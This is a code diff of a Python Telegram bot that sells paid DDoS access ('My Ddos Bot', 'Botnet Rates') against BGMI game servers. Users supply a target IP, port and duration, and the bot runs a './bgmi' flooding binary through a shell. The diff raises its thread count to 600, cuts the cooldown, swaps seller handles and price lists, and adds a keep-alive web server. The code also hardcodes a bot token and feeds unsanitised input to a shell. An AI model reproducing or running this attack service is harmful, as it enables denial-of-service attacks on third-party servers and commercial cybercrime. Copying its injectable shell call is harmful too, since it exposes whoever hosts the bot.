@@ -1,10 +1,12 @@
-#!/usr/bin/python3
-
 import telebot
 import subprocess
 import requests
 import datetime
 import os
+from flask import Flask
+from threading import Thread
+import threading
+import time
 
 # insert your Telegram bot token here
 bot = telebot.TeleBot('7761675538:AAEvCOPGOT6Hdugz-Ym8okixwrzk9RNeqaw')
@@ -96,13 +98,13 @@ def add_user(message):
                 allowed_user_ids.append(user_to_add)
                 with open(USER_FILE, "a") as file:
                     file.write(f"{user_to_add}\n")
-                response = f"User {user_to_add} Ok add kar liya 👍."
+                response = f"User {user_to_add} Added Successfully 👍."
             else:
                 response = "User already exists 🤦‍♂️."
         else:
-            response = "Id bhejo kise add karna he \nlike this👇\n/add 000000000."
+            response = "Please specify a user ID to add 😒."
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nYe Command Sirf he 2 Bande Hi Use Kar Sakte Hn\n@cocog470"
+        response = "ONLY OWNER CAN USE."
 
     bot.reply_to(message, response)
 
@@ -127,7 +129,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
 ✅ Usage: /remove <userid>'''
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nYe Command Sirf he 2 Bande Hi Use Kar Sakte Hn\n@cocog470"
+        response = "ONLY OWNER CAN USE."
 
     bot.reply_to(message, response)
 
@@ -147,7 +149,7 @@ def clear_logs_command(message):
         except FileNotFoundError:
             response = "Logs are already cleared ❌."
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nYe Command Sirf he 2 Bande Hi Use Kar Sakte Hn\n@cocog470"
+        response = "ONLY OWNER CAN USE."
     bot.reply_to(message, response)
 
  
@@ -173,7 +175,7 @@ def show_all_users(message):
         except FileNotFoundError:
             response = "No data found ❌"
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nYe Command Sirf he 2 Bande Hi Use Kar Sakte Hn\n@cocog470"
+        response = "ONLY OWNER CAN USE."
     bot.reply_to(message, response)
 
 
@@ -192,7 +194,7 @@ def show_recent_logs(message):
             response = "No data found ❌"
             bot.reply_to(message, response)
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nYe Command Sirf he 2 Bande Hi Use Kar Sakte Hn\n@cocog470"
+        response = "ONLY OWNER CAN USE."
         bot.reply_to(message, response)
 
 
@@ -207,7 +209,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, \n𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: 🇰 🇭 🇦 🇳 ~🇻 🇮 🇵"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -223,8 +225,8 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 20:
-                response = "You Are On Cooldown ❌. Please Wait 20sec Before Running The /bgmi Command Again."
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
+                response = "You Are On Cooldown ❌. Please Wait 10Sec Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -241,13 +243,13 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./bgmi {target} {port} {time} 600"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nPehle KhanBhai Ko Message Kro\n@cocog470."
+        response = "❌ You Are Not Authorized To Use This Command ❌."
 
     bot.reply_to(message, response)
 
@@ -269,15 +271,15 @@ def show_command_logs(message):
         except FileNotFoundError:
             response = "No command logs found."
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nYe Command Sirf he 2 Bande Hi Use Kar Sakte Hn\n@cocog470"
+        response = "You Are Not Authorized To Use This Command 😡."
 
     bot.reply_to(message, response)
 
 
-@bot.message_handler(commands=['Menu'])
-def show_Menu(message):
-    Menu_text ='''🤖 Available commands:
-💥 /bgmi : Method For Bgmi Servers Freeze. 
+@bot.message_handler(commands=['help'])
+def show_help(message):
+    help_text ='''🤖 Available commands:
+💥 /bgmi : Method For Bgmi Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
 💥 /plan : Checkout Our Botnet Rates.
@@ -285,24 +287,25 @@ def show_Menu(message):
 🤖 To See Admin Commands:
 💥 /admincmd : Shows All Admin Commands.
 
-💪Access buy from:- @cocog470
+Buy From :- @supastrikas7
+Official Channel :- t.me/VIP
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
-            if message.text.startswith('/Menu'):
-                Menu_text += f"{handler.commands[0]}: {handler.doc}\n"
+            if message.text.startswith('/help'):
+                help_text += f"{handler.commands[0]}: {handler.doc}\n"
             elif handler.doc and 'admin' in handler.doc.lower():
                 continue
             else:
-                Menu_text += f"{handler.commands[0]}: {handler.doc}\n"
-    bot.reply_to(message, Menu_text)
+                help_text += f"{handler.commands[0]}: {handler.doc}\n"
+    bot.reply_to(message, help_text)
 
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''👋🏻Welcome to My Ddos Bot, {user_name}
-🤖Try To Run This Command : /Menu 
-✅Access buy from:- https://t.me/khanvipxAndroid'''
+    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
+🤖Try To Run This Command : /help 
+✅Join :- t.me/VIP'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -326,12 +329,9 @@ Vip 🌟 :
 -> Concurrents Attack : 3
 
 Pr-ice List💸 :
-✅ 1 Days  -        ₹99 /- INR  💵 
-✅ 3 Days  -        ₹199 /- INR  💵
-✅ 7 Days  -        ₹449 /- INR  💵       
-✅ 15 Days  -      ₹749 /- INR 💵
-✅ 30 Days  -      ₹1.4k /- INR  💵
-✅DM TO BUY:- @cocog470
+Day-->300 Rs
+Week-->1000 Rs
+Month-->2000 Rs
 '''
     bot.reply_to(message, response)
 
@@ -356,7 +356,7 @@ def broadcast_message(message):
     if user_id in admin_id:
         command = message.text.split(maxsplit=1)
         if len(command) > 1:
-            message_to_broadcast = " Yadav BHAI NE COMMAND DIYA HE KE YE AAP TAB BHEJU👇:\n\n" + command[1]
+            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
             with open(USER_FILE, "r") as file:
                 user_ids = file.read().splitlines()
                 for user_id in user_ids:
@@ -368,18 +368,27 @@ def broadcast_message(message):
         else:
             response = "🤖 Please Provide A Message To Broadcast."
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nYe Command Sirf he 2 Bande Hi Use Kar Sakte Hn\n@cocog470"
+        response = "ONLY OWNER CAN USE."
 
-    bot.reply_to(message, response)
+    bot.reply_to(message, response) 
     
+app = Flask(__name__)
+@app.route('/')
+def index():
+    return "Alive"
+
+def run():
+    app.run(host='0.0.0.0', port=8080)
+
+def keep_alive():
+    t = Thread(target=run)
+    t.start()
+
 if __name__ == "__main__":
+    keep_alive()
+    
     while True:
         try:
             bot.polling(none_stop=True)
-        except requests.exceptions.ReadTimeout:
-            print("Request timed out. Trying again...")
         except Exception as e:
-            print(f"An unexpected error occurred: {e}")
-            time.sleep(1)  # wait for 1 second before restarting bot polling to avoid flooding
- 
-bot.polling()
+            print(e)
